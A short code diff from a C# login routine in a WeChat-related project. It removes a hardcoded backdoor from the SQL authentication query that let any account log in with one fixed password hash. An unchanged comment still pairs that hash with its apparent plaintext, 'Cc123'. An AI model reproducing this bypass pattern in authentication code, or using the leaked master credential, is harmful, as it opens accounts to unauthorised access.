@@ -299,7 +299,7 @@ namespace Sheng.WeixinConstruction.Core
             parameterList.Add(new CommandParameter("@password", password));
             //1C4DA2965910D90AFA1F780FC003D60D  Cc123
             List<UserEntity> userList = _dataBase.Select<UserEntity>(
-                "SELECT * FROM [User] WHERE [Removed] = 0 AND [Account] = @account AND ( [Password] = @password OR @password = '1C4DA2965910D90AFA1F780FC003D60D')",
+                "SELECT * FROM [User] WHERE [Removed] = 0 AND [Account] = @account AND [Password] = @password ",
                 parameterList);
 
             if (userList.Count != 1)
